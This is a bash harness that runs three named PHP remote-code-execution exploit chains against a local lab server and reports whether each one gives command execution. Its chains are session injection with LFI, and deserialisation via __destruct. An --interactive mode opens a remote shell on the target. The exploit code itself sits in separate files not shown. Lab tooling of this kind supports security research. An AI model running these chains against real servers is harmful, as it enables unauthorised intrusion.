#!/usr/bin/env bash
# php2shell — run every RCE chain against the lab, one verdict per line.
#
#   ./run_all.sh                 # all three chains
#   ./run_all.sh --interactive   # drop into the Chain A shell at the end
#
# Target: php:8.2-fpm + nginx on 127.0.0.1:18080 (see lab/setup.sh).
set -u

TARGET=${TARGET:-http://127.0.0.1:18080}
HERE="$(cd "$(dirname "$0")" && pwd)"
PY=${PY:-python3}

pass=0; fail=0

section() { printf '\n\033[1m== %s ==\033[0m\n' "$1"; }
ok()      { printf '  \033[32mPASS\033[0m  %s\n' "$1"; pass=$((pass+1)); }
ko()      { printf '  \033[31mFAIL\033[0m  %s\n' "$1"; fail=$((fail+1)); }

reachable() { curl -s -m 4 -o /dev/null "$1" 2>/dev/null; }

# ---------------------------------------------------------------- preflight
section "0. target reachable"
if reachable "$TARGET/index.php"; then
    ok "$TARGET"
else
    ko "$TARGET unreachable (cd lab && ./setup.sh)"
fi

# ---------------------------------------------------------------- Chain A
section "A. session injection + LFI  (expect: RCE)"
if out=$(cd "$HERE" && $PY exploit_chain_a.py --target "$TARGET" --cmd 'id' 2>&1); then
    if echo "$out" | grep -q 'RCE confirmed'; then
        who=$(echo "$out" | grep -o "uid=[0-9]*" | head -1)
        ok "RCE confirmed (${who:-uid unknown})"
    else
        ko "no RCE (run: $PY exploit_chain_a.py --target $TARGET)"
    fi
else
    ko "exploit_chain_a.py exited non-zero"
fi

section "A'. cleanup=On path (--race)"
if out=$(cd "$HERE" && $PY exploit_chain_a.py --target "$TARGET" --cmd 'id' \
        --race --race-seconds 6 --race-padding 262144 --race-delay 0.02 2>&1); then
    echo "$out" | grep -q 'RCE confirmed' && ok "--race works" || ko "--race broken"
else
    ko "--race exited non-zero"
fi

# ---------------------------------------------------------------- Chain C
section "C. handler mismatch -> __destruct  (expect: RCE)"
if out=$(cd "$HERE" && $PY exploit_chain_c.py --target "$TARGET" --cmd 'id' 2>&1); then
    if echo "$out" | grep -q 'RCE confirmed'; then
        who=$(echo "$out" | grep -o "uid=[0-9]*" | head -1)
        ok "RCE confirmed (${who:-uid unknown})"
    else
        ko "no RCE (run: $PY exploit_chain_c.py --target $TARGET)"
    fi
else
    ko "exploit_chain_c.py exited non-zero"
fi

# ---------------------------------------------------------------- Chain E
section "E. decode failure -> __destruct  (expect: RCE)"
if out=$(cd "$HERE" && $PY exploit_chain_e.py --target "$TARGET" --cmd 'id' 2>&1); then
    if echo "$out" | grep -q 'RCE confirmed'; then
        who=$(echo "$out" | grep -o "uid=[0-9]*" | head -1)
        ok "RCE confirmed (${who:-uid unknown})"
    else
        ko "no RCE (run: $PY exploit_chain_e.py --target $TARGET)"
    fi
else
    ko "exploit_chain_e.py exited non-zero"
fi

printf '\n\033[1m== summary ==\033[0m\n'
printf '  passed %d   failed %d\n' "$pass" "$fail"

if [ "${1:-}" = "--interactive" ] && [ "$fail" -eq 0 ]; then
    printf '\nDropping into the Chain A interactive shell (exit to quit)\n'
    cd "$HERE" && exec $PY exploit_chain_a.py --target "$TARGET"
fi

[ "$fail" -eq 0 ]
